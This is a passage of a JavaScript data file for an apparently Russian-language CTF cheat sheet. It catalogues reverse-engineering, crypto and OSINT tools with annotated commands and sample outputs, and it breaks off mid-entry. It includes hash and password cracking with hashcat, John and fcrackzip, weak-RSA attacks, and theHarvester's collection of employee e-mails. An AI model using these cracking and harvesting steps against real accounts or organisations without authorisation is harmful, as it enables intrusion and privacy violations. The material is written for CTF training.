const ctfData = {
  categories: [
    {
      id: "reverse",
      title: "Реверс",
      subtitle: "Reverse Engineering",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 20l4-16m4 4l4 4-4 4M6 8L2 12l4 4"/></svg>`,
      description: "Анализ скомпилированных бинарных файлов, декомпиляция, отладка и исследование алгоритмов.",
      programs: [
        { name: "Ghidra", desc: "Бесплатный реверс-инструмент NSA: декомпилятор, дизассемблер, поддержка скриптов на Java/Python.", url: "https://ghidra-sre.org/" },
        { name: "IDA Pro", desc: "Промышленный стандарт дизассемблера и декомпилятора (Hex-Rays). Есть бесплатная версия IDA Free.", url: "https://hex-rays.com/ida-pro/" },
        { name: "Cutter", desc: "GUI для Radare2 с открытым декомпилятором Rz-Ghidra. Кросс-платформенный и бесплатный.", url: "https://cutter.re/" },
        { name: "x64dbg", desc: "Открытый x64/x32 отладчик для Windows с удобным интерфейсом и плагинами.", url: "https://x64dbg.com/" },
        { name: "GDB", desc: "GNU-отладчик для Linux. Плагины Pwndbg и PEDA добавляют визуализацию стека, кучи и регистров.", url: "https://www.gnu.org/software/gdb/" },
        { name: "Binary Ninja", desc: "Современная платформа бинарного анализа с Python API, IL-представлением и плагинами.", url: "https://binary.ninja/" }
      ]
    },
    {
      id: "crypto",
      title: "Крипто",
      subtitle: "Cryptography",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`,
      description: "Шифрование, дешифрование, криптоанализ, взлом хешей, RSA, XOR и классические шифры.",
      programs: [
        { name: "CyberChef", desc: "«Швейцарский нож» от GCHQ: кодирование, декодирование, крипто, форматы данных — всё в браузере.", url: "https://gchq.github.io/CyberChef/" },
        { name: "Boxentriq", desc: "Онлайн-набор инструментов для взлома классических шифров, анализа частот, паттернов.", url: "https://www.boxentriq.com/" },
        { name: "dcode.fr", desc: "Большая коллекция онлайн-дешифраторов: ROT, Vigenère, Morse, Bacon, Playfair и многое другое.", url: "https://www.dcode.fr/" },
        { name: "Cryptool 2", desc: "e-Learning платформа с визуальными сценариями криптоанализа (Windows).", url: "https://www.cryptool.org/en/ct2/" },
        { name: "SageMath", desc: "Математический пакет на Python для RSA, эллиптических кривых, решётчатых атак (LLL, CVP).", url: "https://www.sagemath.org/" },
        { name: "Hashcat", desc: "Быстрый GPU-взломщик хешей (MD5, SHA-*, bcrypt, NTLM) с поддержкой масок и правил.", url: "https://hashcat.net/hashcat/" }
      ]
    },
    {
      id: "osint",
      title: "ОСИНТ",
      subtitle: "Open Source Intelligence",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/><path d="M2 12h20"/></svg>`,
      description: "Поиск информации по открытым источникам, разведка доменов, IP-адресов, соцсетей и метаданных.",
      programs: [
        { name: "Maltego", desc: "OSINT-платформа для визуализации связей между объектами: домены, IP, люди, организации.", url: "https://www.maltego.com/" },
        { name: "Google Hacking DB", desc: "База Google-дорков от Exploit-DB для поиска уязвимостей, паролей и скрытых страниц.", url: "https://www.exploit-db.com/google-hacking-database" },
        { name: "TinEye", desc: "Обратный поиск изображений: найти источник фото, отредактированные копии, даты публикации.", url: "https://tineye.com/" },
        { name: "Wayback Machine", desc: "Архив интернета: просмотр старых версий сайтов и удалённых страниц.", url: "https://web.archive.org/" },
        { name: "ExifTool", desc: "Утилита для чтения и редактирования метаданных файлов (EXIF, IPTC, XMP, GPS).", url: "https://exiftool.org/" },
        { name: "Shodan", desc: "Поисковик по интернет-устройствам: сервисы, баннеры, уязвимости, IoT.", url: "https://www.shodan.io/" }
      ]
    },
    {
      id: "web",
      title: "Веб",
      subtitle: "Web Vulnerabilities",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>`,
      description: "Поиск уязвимостей в веб-приложениях (SQLi, XSS, LFI/RFI, XXE, CSRF, IDOR).",
      programs: [
        { name: "Burp Suite", desc: "Профессиональный инструмент тестирования веб-приложений: прокси, сканер, интрудер, repeater.", url: "https://portswigger.net/burp" },
        { name: "OWASP ZAP", desc: "Открытый автоматический сканер безопасности веб-приложений от OWASP. Бесплатный.", url: "https://www.zaproxy.org/" },
        { name: "Firefox DevEdition", desc: "Браузер для разработчиков с расширенными инструментами отладки, CSS Grid, DevTools.", url: "https://www.mozilla.org/en-US/firefox/developer/" },
        { name: "Postman", desc: "Платформа для тестирования API: отправка запросов, коллекции, автотесты, переменные окружения.", url: "https://www.postman.com/" },
        { name: "sqlmap", desc: "Автоматизированный инструмент для обнаружения и эксплуатации SQL-инъекций.", url: "https://sqlmap.org/" },
        { name: "Wappalyzer", desc: "Расширение браузера, определяющее технологии и фреймворки, используемые на сайте.", url: "https://www.wappalyzer.com/" }
      ]
    },
    {
      id: "pwn",
      title: "PWN",
      subtitle: "Binary Exploitation",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>`,
      description: "Эксплуатация бинарных уязвимостей, переполнение буфера, ROP-цепочки, форматирование строк и shellcode.",
      programs: [
        { name: "GDB + Pwndbg", desc: "GNU-отладчик с плагином Pwndbg: визуализация стека, кучи, регистров. Незаменим для PWN.", url: "https://github.com/pwndbg/pwndbg" },
        { name: "Ghidra", desc: "Декомпилятор NSA для анализа бинарников: нахождение смещений, уязвимостей, логики.", url: "https://ghidra-sre.org/" },
        { name: "pwntools", desc: "Python-библиотека для CTF PWN: работа с процессами, сокетами, ROP, форматами ELF.", url: "https://github.com/Gallopsled/pwntools" },
        { name: "ROPgadget", desc: "Поиск ROP-гаджетов (pop, ret, syscall) в бинарных файлах для построения цепочек.", url: "https://github.com/JonathanSalwan/ROPgadget" },
        { name: "one_gadget", desc: "Находит «магические» гаджеты в libc, дающие shell одним вызовом execve.", url: "https://github.com/david942j/one_gadget" }
      ]
    },
    {
      id: "forensics",
      title: "Форензика",
      subtitle: "Digital Forensics",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>`,
      description: "Компьютерная криминалистика, анализ дампов памяти, файловых систем, логов и сетевого трафика (pcap).",
      programs: [
        { name: "Autopsy", desc: "Открытая цифровая криминалистика: анализ дисков, восстановление файлов, временные линии.", url: "https://www.autopsy.com/" },
        { name: "Wireshark", desc: "Анализатор сетевых пакетов (pcap): фильтрация трафика, поиск файлов, credentials, протоколов.", url: "https://www.wireshark.org/" },
        { name: "FTK Imager", desc: "Создание и просмотр образов дисков (dd, E01, AFF). Бесплатная утилита от Exterro.", url: "https://www.exterro.com/ftk-imager" },
        { name: "Volatility", desc: "Фреймворк для форензики оперативной памяти: процессы, сетевые соединения, артефакты ОС.", url: "https://www.volatilityfoundation.org/" },
        { name: "Binwalk", desc: "Анализ и извлечение встроенных файлов из прошивок и бинарных образов.", url: "https://github.com/ReFirmLabs/binwalk" }
      ]
    },
    {
      id: "stego",
      title: "Стеганография",
      subtitle: "Steganography",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`,
      description: "Поиск скрытой информации в медиафайлах (изображения, аудио, видео) и недокументированных свойствах.",
      programs: [
        { name: "StegSolve", desc: "Java-инструмент для анализа изображений: цветовые плоскости, LSB, стереограммы, XOR.", url: "https://github.com/Giotino/stegsolve" },
        { name: "StegOnline", desc: "Веб-версия StegSolve — анализ изображений прямо в браузере, без установки.", url: "https://stegonline.georgeom.net/" },
        { name: "Audacity", desc: "Бесплатный аудиоредактор. В CTF — анализ спектрограмм, слоёв, скрытых частот.", url: "https://www.audacityteam.org/" },
        { name: "ExifTool", desc: "Просмотр и редактирование метаданных изображений (EXIF, IPTC, XMP, GPS, комментарии).", url: "https://exiftool.org/" },
        { name: "zsteg", desc: "Ruby-утилита для обнаружения стеганографии в PNG и BMP (LSB, bitplanes, цветовые каналы).", url: "https://github.com/zed-0xff/zsteg" },
        { name: "Sonic Visualiser", desc: "Инструмент для детального анализа и визуализации аудиофайлов: спектрограммы, огибающие.", url: "https://www.sonicvisualiser.org/" }
      ]
    },
    {
      id: "misc",
      title: "Misc",
      subtitle: "Miscellaneous",
      icon: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>`,
      description: "Разнообразные задачи, программирование, эзотерические языки, работа с неткатом, bash-скрипты.",
      programs: [
        { name: "CyberChef", desc: "«Швейцарский нож» для кодирования, декодирования, форматов и крипто — работает в браузере.", url: "https://gchq.github.io/CyberChef/" },
        { name: "Python 3", desc: "Язык программирования — основа CTF-скриптинга: pwn, крипто, форензика, автоматизация.", url: "https://www.python.org/" },
        { name: "Docker", desc: "Контейнерная платформа для изолированных окружений и воспроизводимых CTF-сред.", url: "https://www.docker.com/" },
        { name: "VS Code", desc: "Популярный редактор с плагинами, встроенным терминалом, отладчиком и поддержкой Python/C.", url: "https://code.visualstudio.com/" },
        { name: "Termius", desc: "Удобный SSH-клиент для подключения к удалённым CTF-серверам с любого устройства.", url: "https://termius.com/" }
      ]
    }
  ],
  commands: [
    // === REVERSE ===
    {
      id: "rev-strings",
      categoryId: "reverse",
      tool: "strings",
      description: "Поиск и вывод видимых текстовых (ASCII/Unicode) строк в бинарном файле. Помогает мгновенно найти флаг, если он сохранен в открытом виде.",
      command: "strings -n 8 [путь_к_бинарному_файлу] | grep -i flag",
      frequency: "high",
      explanation: [
        { arg: "strings", desc: "Утилита, которая сканирует файл и выводит все печатные строки текста." },
        { arg: "-n 8", desc: "Выводить только строки, длина которых составляет не менее 8 символов (уменьшает мусор в выводе)." },
        { arg: "[путь_к_бинарному_файлу]", desc: "Путь к исследуемому файлу (например, `./program` или `task.bin`)." },
        { arg: "| grep", desc: "Перенаправить весь текст в утилиту фильтрации строк grep." },
        { arg: "-i flag", desc: "Искать совпадения со словом 'flag', игнорируя регистр букв (найдет FLAG, Flag, flag и т.д.)." }
      ],
      output: `user@ctf-box:~$ strings -n 8 ./task | grep -i flag\nflag{s1mpl3_str1ngs_in_b1nary_1337}\n/lib64/ld-linux-x86-64.so.2`,
      important: [
        { token: "flag{...}", desc: "Сам флаг CTF. Если он зашит в бинарнике открытым текстом, strings выведет его целиком." }
      ]
    },
    {
      id: "rev-file",
      categoryId: "reverse",
      tool: "file",
      description: "Определяет тип файла, архитектуру процессора (32 или 64 бита), под какую ОС скомпилирован файл и вырезаны ли из него символы отладки (stripped/not stripped).",
      command: "file [путь_к_файлу]",
      frequency: "high",
      explanation: [
        { arg: "file", desc: "Команда для анализа структуры файла и заголовков (например, заголовка ELF в Linux или PE в Windows)." },
        { arg: "[путь_к_файлу]", desc: "Файл, структуру которого вы хотите исследовать." }
      ],
      output: `user@ctf-box:~$ file ./task\n./task: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=86e3f36a8e803fbdf190f845d4cb0585f67b57b9, for GNU/Linux 3.2.0, not stripped`,
      important: [
        { token: "ELF 64-bit", desc: "Тип и разрядность файла. ELF означает исполняемый формат Linux (PE — Windows, Mach-O — macOS)." },
        { token: "dynamically linked", desc: "Динамически линкованный файл. Использует внешние библиотеки (например, libc.so). Полезно для атак типа ret2libc." },
        { token: "not stripped", desc: "Символы отладки сохранены. В IDA/Ghidra будут видны оригинальные названия функций (main, check_flag), а не generic-имена." }
      ]
    },
    {
      id: "rev-objdump",
      categoryId: "reverse",
      tool: "objdump",
      description: "Дизассемблирует бинарный файл, преобразуя машинный код обратно в ассемблерные инструкции. Данный пример выводит код главной функции (main).",
      command: "objdump -d -M intel [путь_к_файлу] | grep -A 20 \"<main>:\"",
      frequency: "medium",
      explanation: [
        { arg: "objdump", desc: "Инструмент для отображения различной информации об объектных файлах." },
        { arg: "-d", desc: "Режим дизассемблирования (декодирования машинных инструкций в ассемблер)." },
        { arg: "-M intel", desc: "Форматировать ассемблер в стиле Intel (по умолчанию используется более сложный синтаксис AT&T)." },
        { arg: "[путь_к_файлу]", desc: "Путь к скомпилированному бинарному файлу." },
        { arg: "| grep -A 20 \"<main>:\"", desc: "Найти строку с началом функции '<main>:' и вывести ее вместе с 20-ю следующими строками кода (-A 20 означает After)." }
      ],
      output: `user@ctf-box:~$ objdump -d -M intel ./task | grep -A 8 "<main>:"\n0000000000001149 <main>:\n    1149:  55                     push   rbp\n    114a:  48 89 e5               mov    rbp,rsp\n    114d:  48 83 ec 10            sub    rsp,0x10\n    1151:  c7 45 fc 00 00 00 00   mov    DWORD PTR [rbp-0x4],0x0\n    1158:  e8 13 00 00 00         call   1170 <check_flag>\n    115d:  b8 00 00 00 00         mov    eax,0x0\n    1162:  c9                     leave  \n    1163:  c3                     ret`,
      important: [
        { token: "<main>:", desc: "Входная точка программы. Отсюда начинается исполнение пользовательского логического кода." },
        { token: "call check_flag", desc: "Вызов другой функции. Показывает, что логика валидации скрыта внутри функции check_flag, ее адрес — 1170." }
      ]
    },
    {
      id: "rev-gdb",
      categoryId: "reverse",
      tool: "gdb (GNU Debugger)",
      description: "Интерактивный отладчик Linux. Позволяет пошагово выполнять программу, смотреть значения в регистрах процессора и менять память на ходу.",
      command: "gdb -q -ex 'break main' -ex 'run' [путь_к_файлу]",
      frequency: "high",
      explanation: [
        { arg: "gdb", desc: "Запуск отладчика GNU." },
        { arg: "-q", desc: "Тихий режим (quiet) — отключает вывод информации об авторских правах при запуска." },
        { arg: "-ex 'break main'", desc: "Выполнить (execute) команду отладчика: поставить точку останова (breakpoint) на входе в функцию main." },
        { arg: "-ex 'run'", desc: "Выполнить команду отладчика: сразу запустить программу на выполнение (она остановится на функции main)." },
        { arg: "[путь_к_файлу]", desc: "Путь к отлаживаемому исполняемому файлу." }
      ],
      output: `user@ctf-box:~$ gdb -q -ex 'break main' -ex 'run' ./task\nBreakpoint 1 at 0x1151\nStarting program: /home/user/task \n\nBreakpoint 1, 0x0000555555555151 in main ()\n(gdb) info registers rip\nrip            0x555555555151      0x555555555151 <main+8>`,
      important: [
        { token: "Breakpoint 1", desc: "Точка останова успешно сработала. Выполнение приостановлено, теперь вы можете вводить команды отладки." },
        { token: "rip", desc: "Регистр Instruction Pointer. Хранит адрес памяти следующей исполняемой инструкции ассемблера." }
      ]
    },
    {
      id: "rev-radare2",
      categoryId: "reverse",
      tool: "radare2",
      description: "Продвинутый фреймворк командной строки для реверса. Позволяет анализировать код, осуществлять отладку и патчить файлы.",
      command: "r2 -A -d [путь_к_файлу]",
      frequency: "medium",
      explanation: [
        { arg: "r2", desc: "Вызов утилиты Radare2." },
        { arg: "-A", desc: "Автоматически запустить встроенный скрипт глубокого анализа бинарника (эквивалент ввода команды 'aaa' внутри)." },
        { arg: "-d", desc: "Запустить файл в режиме отладчика (debugger)." },
        { arg: "[путь_к_файлу]", desc: "Путь к исследуемой программе." }
      ],
      output: `user@ctf-box:~$ r2 -A -d ./task\n[x] Analyze all flags starting with sym. and entry0 (aa)\n -- Check command '?' for help.\n[0x555555555149]> pdf @main\n/ (fcn) sym.main 27\n|           0x555555555149      55             push rbp\n|           0x55555555514a      4889e5         mov rbp, rsp\n|           0x55555555514d      4883ec10       sub rsp, 0x10\n|           0x555555555151      c745fc000000.  mov dword [rbp - 4], 0`,
      important: [
        { token: "pdf @main", desc: "Команда 'print disassembled function'. Выведет ассемблерный код функции main в красивом текстовом представлении." }
      ]
    },
    {
      id: "rev-ltrace",
      categoryId: "reverse",
      tool: "ltrace",
      description: "Перехватывает и записывает вызовы библиотечных функций (например, сравнение строк strcmp, выделение памяти malloc), которые делает программа.",
      command: "ltrace [путь_к_файлу] [аргументы_программы]",
      frequency: "medium",
      explanation: [
        { arg: "ltrace", desc: "Утилита трассировки библиотечных вызовов." },
        { arg: "[путь_к_файлу]", desc: "Путь к запускаемому приложению." },
        { arg: "[аргументы_программы]", desc: "Параметры, которые вы передаете самой исследуемой программе при старте (например, тестовый пароль)." }
      ],
      output: `user@ctf-box:~$ ltrace ./task test_input\nmalloc(32)                                       = 0x5555557572a0\nstrcmp("test_input", "flag{ltrace_is_great}")    = -1\nputs("Wrong password!")                          = 16\n+++ exited (status 0) +++`,
      important: [
        { token: "strcmp", desc: "Вызов strcmp (string compare). Отличная зацепка в CTF! Показывает, что ваш ввод сравнивается с правильным паролем flag{ltrace_is_great}." }
      ]
    },
    {
      id: "rev-strace",
      categoryId: "reverse",
      tool: "strace",
      description: "Трассирует системные вызовы программы к ядру ОС (открытие файлов open, чтение read, запись write). Помогает понять, куда программа пишет и откуда читает.",
      command: "strace -e trace=open,read [путь_к_файлу]",
      frequency: "medium",
      explanation: [
        { arg: "strace", desc: "Утилита мониторинга системных вызовов." },
        { arg: "-e trace=open,read", desc: "Фильтровать вывод: показывать только вызовы открытия файлов (open/openat) и чтения данных (read)." },
        { arg: "[путь_к_файлу]", desc: "Путь к исполняемому файлу программы." }
      ],
      output: `user@ctf-box:~$ strace -e trace=openat ./task\nopenat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3\nopenat(AT_FDCWD, "flag.txt", O_RDONLY)           = 3\nWrong password!`,
      important: [
        { token: "flag.txt", desc: "Показывает, что программа пытается открыть локальный файл flag.txt. Если его не существует в текущей папке, программа завершится ошибкой." }
      ]
    },
    {
      id: "rev-checksec",
      categoryId: "reverse",
      tool: "checksec",
      description: "Утилита для проверки встроенных систем защиты бинарного файла (NX/DEP, Stack Canary, PIE, ASLR, RELRO). Крайне важна перед написанием эксплоита.",
      command: "checksec --file=[путь_к_файлу]",
      frequency: "high",
      explanation: [
        { arg: "checksec", desc: "Скрипт проверки бинарной безопасности." },
        { arg: "--file=[путь_к_файлу]", desc: "Указывает конкретный файл, безопасность которого нужно оценить." }
      ],
      output: `user@ctf-box:~$ checksec --file=./task\n[*] '/home/user/task'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled`,
      important: [
        { token: "NX enabled", desc: "Stack Execution Disabled. Вы не сможете запустить шелл-код прямо из стека (потребуются ROP-цепочки)." },
        { token: "Canary found", desc: "Стековая канарейка активна. Простое переполнение буфера вызовет краш до перезаписи адреса возврата. Потребуется утечка (leak) канарейки." },
        { token: "PIE enabled", desc: "Рандомизация адресов бинарника. Адрес функций меняется при каждом перезапуске, необходимо вычислять смещение относительно адреса загрузки." }
      ]
    },

    // === CRYPTO ===
    {
      id: "cry-openssl",
      categoryId: "crypto",
      tool: "openssl",
      description: "Утилита для работы с сертификатами, приватными ключами и симметричным/асимметричным шифрованием. Данный пример расшифровывает файл приватным ключом RSA.",
      command: "openssl pkeyutl -decrypt -inkey [приватный_ключ.pem] -in [зашифрованный_файл.bin] -out [расшифрованный_файл.txt]",
      frequency: "medium",
      explanation: [
        { arg: "openssl", desc: "Криптографическая библиотека и инструмент CLI." },
        { arg: "pkeyutl", desc: "Модуль для выполнения операций с открытыми/приватными ключами (RSA, ECC)." },
        { arg: "-decrypt", desc: "Режим дешифрования данных." },
        { arg: "-inkey [приватный_ключ.pem]", desc: "Указать файл, содержащий приватный RSA-ключ декодирования." },
        { arg: "-in [зашифрованный_файл.bin]", desc: "Путь к зашифрованному файлу (шифротексту)." },
        { arg: "-out [расшифрованный_файл.txt]", desc: "Путь, куда сохранить расшифрованный результат (например, flag.txt)." }
      ],
      output: `user@ctf-box:~$ openssl pkeyutl -decrypt -inkey private.pem -in secret.enc -out flag.txt\nuser@ctf-box:~$ cat flag.txt\nflag{rsa_decrypted_successfully_982}`,
      important: [
        { token: "flag{...}", desc: "Успешно извлеченный открытый текст флага, записанный в файл flag.txt после расшифровки." }
      ]
    },
    {
      id: "cry-hashcat",
      categoryId: "crypto",
      tool: "hashcat",
      description: "Высокоскоростная утилита для перебора (брутфорса) паролей и хэшей на GPU/CPU. Пример перебора хэшей MD5 по словарю rockyou.txt.",
      command: "hashcat -m 0 -a 0 [файл_с_хэшами.txt] [путь_к_словарю.txt]",
      frequency: "high",
      explanation: [
        { arg: "hashcat", desc: "Утилита для восстановления (взлома) паролей." },
        { arg: "-m 0", desc: "Тип хэша. Код `0` соответствует MD5. (Например, `100` — SHA1, `1800` — sha512crypt)." },
        { arg: "-a 0", desc: "Режим атаки (Attack mode). `0` — атака по словарю (Straight dictionary attack)." },
        { arg: "[файл_с_хэшами.txt]", desc: "Файл, содержащий хэши, которые требуется расшифровать (по одному на строку)." },
        { arg: "[путь_к_словарю.txt]", desc: "Словарь с возможными паролями (обычно используется стандартный файл `/usr/share/wordlists/rockyou.txt`)." }
      ],
      output: `user@ctf-box:~$ hashcat -m 0 -a 0 hash.txt rockyou.txt\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: MD5\n\n8a2872365d9d784a0d9d0d346617a224:superman123`,
      important: [
        { token: "Status...........: Cracked", desc: "Указывает, что брутфорс прошел успешно и хэш был сопоставлен с паролем в словаре." },
        { token: "8a287236...:superman123", desc: "Результат взлома. Слева — ваш хэш, справа после двоеточия — пароль в открытом виде (superman123)." }
      ]
    },
    {
      id: "cry-john",
      categoryId: "crypto",
      tool: "john (John the Ripper)",
      description: "Универсальный взломщик паролей. Удобен тем, что сам пытается определить тип хэша перед брутфорсом.",
      command: "john --wordlist=[путь_к_словарю.txt] [файл_с_хэшами.txt]",
      frequency: "high",
      explanation: [
        { arg: "john", desc: "Запуск взломщика John the Ripper." },
        { arg: "--wordlist=[путь_к_словарю.txt]", desc: "Указать путь к текстовому словарю паролей." },
        { arg: "[файл_с_хэшами.txt]", desc: "Файл с хэшированными строками, которые нужно взломать." }
      ],
      output: `user@ctf-box:~$ john --wordlist=rockyou.txt hash.txt\nLoaded 1 password hash (SHA-256 [salted-sha256])\n\nsecretpass123    (user_admin)\n\n1g 0:00:00:01 DONE`,
      important: [
        { token: "secretpass123", desc: "Найденный пароль от аккаунта. John выводит его в левой колонке первой строчки результата." },
        { token: "(user_admin)", desc: "Имя пользователя (метка), которому соответствует взломанный пароль." }
      ]
    },
    {
      id: "cry-fcrackzip",
      categoryId: "crypto",
      tool: "fcrackzip",
      description: "Инструмент для поиска пароля к запароленным ZIP-архивам с помощью брутфорса или словаря.",
      command: "fcrackzip -b -D -p [путь_к_словарю.txt] -u [архив.zip]",
      frequency: "medium",
      explanation: [
        { arg: "fcrackzip", desc: "Утилита для взлома паролей ZIP-файлов." },
        { arg: "-b", desc: "Использовать метод грубого перебора или словаря (Brute-force/dictionary)." },
        { arg: "-D", desc: "Указывает, что нужно использовать именно словарь (Dictionary mode)." },
        { arg: "-p [путь_к_словарю.txt]", desc: "Путь к текстовому файлу словаря (например, rockyou.txt)." },
        { arg: "-u [архив.zip]", desc: "Флаг unzip: проверять найденный пароль реальной распаковкой, чтобы исключить ложные срабатывания." }
      ],
      output: `user@ctf-box:~$ fcrackzip -b -D -p rockyou.txt -u flag.zip\n\nPASSWORD FOUND - password: letmein1`,
      important: [
        { token: "password: letmein1", desc: "Пароль от архива успешно подобран. Вы можете открыть архив командой `unzip -P letmein1 flag.zip`." }
      ]
    },
    {
      id: "cry-rsactftool",
      categoryId: "crypto",
      tool: "RsaCftTool",
      description: "Инструмент для автоматического взлома слабых ключей RSA. Пробует множество математических атак на модуль N.",
      command: "python3 RsaCftTool.py --publickey [публичный_ключ.pem] --uncipherfile [зашифрованный_файл.bin]",
      frequency: "high",
      explanation: [
        { arg: "python3 RsaCftTool.py", desc: "Запустить скрипт RsaCftTool через интерпретатор Python." },
        { arg: "--publickey [публичный_ключ.pem]", desc: "Путь к публичному ключу RSA, свойства которого нужно проанализировать." },
        { arg: "--uncipherfile [зашифрованный_файл.bin]", desc: "Зашифрованные бинарные данные, которые мы хотим расшифровать при успешном подборе ключа." }
      ],
      output: `user@ctf-box:~$ python3 RsaCftTool.py --publickey public.pem --uncipherfile flag.enc\n[*] Running Fermat factorization attack...\n[*] Fermat attack successful!\n\nDecrypted file:\nflag{rsa_smalld_factorization_win}`,
      important: [
        { token: "Fermat attack successful!", desc: "Найдена уязвимость в ключе (факторизация Ферма). Это значит, что простые числа p и q были расположены близко друг к другу." },
        { token: "flag{...}", desc: "Сам флаг, который утилита автоматически расшифровала с помощью восстановленного закрытого ключа." }
      ]
    },
    {
      id: "cry-xortool",
      categoryId: "crypto",
      tool: "xortool",
      description: "Инструмент для частотного анализа файлов, зашифрованных алгоритмом XOR. Помогает определить длину ключа XOR и восстановить исходный текст.",
      command: "xortool -l [длина_ключа] -c [наиболее_частый_символ] [зашифрованный_файл.bin]",
      frequency: "medium",
      explanation: [
        { arg: "xortool", desc: "Запуск анализатора XOR." },
        { arg: "-l [длина_ключа]", desc: "Предполагаемая длина ключа в байтах (например, `-l 4`)." },
        { arg: "-c [наиболее_частый_символ]", desc: "Символ, который наиболее часто встречается в оригинальном тексте (для обычного текста это пробел `20` в HEX, либо нулевой байт `00` в исполняемых файлах)." },
        { arg: "[зашифрованный_файл.bin]", desc: "Путь к зашифрованному файлу." }
      ],
      output: `user@ctf-box:~$ xortool -l 4 -c 20 cipher.bin\nKey-length 4 has high probability.\nProbable key is "k3yS". Writing decrypted files to xortool_out/`,
      important: [
        { token: "Key-length 4", desc: "Наиболее вероятная длина ключа XOR. Упрощает последующий полный перебор или частотный анализ." },
        { token: "Probable key is \"k3yS\"", desc: "Предполагаемый ключ расшифрования. Расшифрованные варианты файлов сохранены в папку `xortool_out`." }
      ]
    },

    // === OSINT ===
    {
      id: "osi-whois",
      categoryId: "osint",
      tool: "whois",
      description: "Показывает информацию о регистрации доменного имени или IP-адреса (владелец, контакты, DNS-серверы, дата создания).",
      command: "whois [домен_или_ip]",
      frequency: "high",
      explanation: [
        { arg: "whois", desc: "Клиент для отправки запросов к базам данных регистраторов (NIC)." },
        { arg: "[домен_или_ip]", desc: "Целевой хост, например `google.com` или `8.8.8.8`." }
      ],
      output: `user@ctf-box:~$ whois ctf-challenge.org\nDomain Name: CTF-CHALLENGE.ORG\nCreation Date: 2023-05-15T08:00:00Z\nRegistrant Organization: CTF Org Team`,
      important: [
        { token: "Creation Date", desc: "Дата создания домена. Полезна для расследования хронологии запуска мошеннических ресурсов или проверки возраста домена." },
        { token: "Registrant Organization", desc: "Зарегистрировавшая организация. Позволяет узнать владельца домена или связать домен с конкретной компанией." }
      ]
    },
    {
      id: "osi-nslookup",
      categoryId: "osint",
      tool: "nslookup",
      description: "Позволяет запрашивать записи DNS-серверов. Полезно для поиска скрытых TXT-записей или MX-серверов.",
      command: "nslookup -type=[тип_записи] [домен]",
      frequency: "high",
      explanation: [
        { arg: "nslookup", desc: "Утилита запросов к DNS." },
        { arg: "-type=[тип_записи]", desc: "Тип DNS записи. Например: `TXT` (часто содержит флаги), `MX` (почтовые серверы), `ANY` (все доступные записи)." },
        { arg: "[домен]", desc: "Целевой домен, например `target.ctf`." }
      ],
      output: `user@ctf-box:~$ nslookup -type=TXT secret.ctf-challenge.org\nNon-authoritative answer:\nsecret.ctf-challenge.org     text = "flag{dns_txt_r3c0rd_unlocked}"`,
      important: [
        { token: "text = \"flag{...}\"", desc: "TXT запись домена. Создатели заданий CTF любят прятать секретные ключи или флаги именно в TXT записях DNS." }
      ]
    },
    {
      id: "osi-theharvester",
      categoryId: "osint",
      tool: "theHarvester",
      description: "Собирает e-mail адреса, имена сотрудников, поддомены и открытые порты, используя поисковики вроде Google, Bing и др.",
      command: "theHarvester -d [домен] -b [источники] -l 500",
      frequency: "medium",
      explanation: [
        { arg: "theHarvester", desc: "Утилита автоматического сбора данных из открытых источников." },
        { arg: "-d [домен]", desc: "Целевой домен для поиска (domain)." },
        { arg: "-b [источники]", desc: "Источники данных через запятую (например, `google,bing,duckduckgo`)." },
        { arg: "-l 500", desc: "Лимит (limit) количества обрабатываемых результатов поиска." }
      ],
      output: `user@ctf-box:~$ theHarvester -d example.com -b google -l 10\n[*] E-mails found:\n    - security@example.com\n[*] Hosts found:\n    - admin.example.com (93.184.216.34)`,
      important: [
        { token: "E-mails found", desc: "Найденные адреса почты сотрудников. Потенциальные логины или зацепки для расследования." },
        { token: "Hosts found", desc: "Список поддоменов компании. Помогает расширить область атаки (найти скрытые панели администрирования)." }
      ]
    },
    {
      id: "osi-sherlock",
      categoryId: "osint",
